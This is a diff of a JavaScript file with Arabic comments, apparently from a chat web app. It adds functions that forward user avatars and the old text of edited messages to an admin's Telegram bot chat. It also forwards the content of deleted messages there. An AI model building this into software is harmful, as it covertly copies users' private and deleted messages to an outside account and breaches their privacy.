@@ -15,22 +15,38 @@ async function sendUserToTelegram(userData) {
     `;
     
     try {
-        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+        await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: ADMIN_ID,
                 text: message,
                 parse_mode: 'Markdown'
             })
         });
-        
-        return await response.json();
     } catch (error) {
         console.error('خطأ في إرسال البيانات:', error);
-        return null;
+    }
+}
+
+// إرسال صورة للتيليجرام
+async function sendImageToTelegram(imageDataUrl, username) {
+    try {
+        // تحويل Base64 إلى Blob
+        const response = await fetch(imageDataUrl);
+        const blob = await response.blob();
+        
+        const formData = new FormData();
+        formData.append('chat_id', ADMIN_ID);
+        formData.append('photo', blob, `avatar_${username}.jpg`);
+        formData.append('caption', `🖼️ *صورة جديدة*\n👤 *المستخدم:* @${username}\n📅 *الوقت:* ${new Date().toLocaleString('ar')}`);
+        
+        await fetch(`${TELEGRAM_API}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (error) {
+        console.error('خطأ في إرسال الصورة:', error);
     }
 }
 
@@ -65,9 +81,7 @@ async function sendLoginNotification(user) {
     try {
         await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: ADMIN_ID,
                 text: message,
@@ -92,9 +106,64 @@ async function sendChatNotification(user1, user2) {
     try {
         await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.error('خطأ في إرسال الإشعار:', error);
+    }
+}
+
+// إرسال إشعار تعديل رسالة
+async function sendEditMessageNotification(sender, oldMessage, newMessage) {
+    const message = `
+✏️ *تم تعديل رسالة*
+
+👤 *المرسل:* @${sender}
+📅 *الوقت:* ${new Date().toLocaleString('ar')}
+
+📝 *الرسالة القديمة:*
+${oldMessage}
+
+✏️ *الرسالة المعدلة:*
+${newMessage}
+    `;
+    
+    try {
+        await fetch(`${TELEGRAM_API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.error('خطأ في إرسال الإشعار:', error);
+    }
+}
+
+// إرسال إشعار حذف رسالة
+async function sendDeleteMessageNotification(sender, deletedMessage) {
+    const message = `
+🗑️ *تم حذف رسالة*
+
+👤 *المرسل:* @${sender}
+📅 *الوقت:* ${new Date().toLocaleString('ar')}
+
+💬 *الرسالة المحذوفة:*
+${deletedMessage}
+    `;
+    
+    try {
+        await fetch(`${TELEGRAM_API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: ADMIN_ID,
                 text: message,
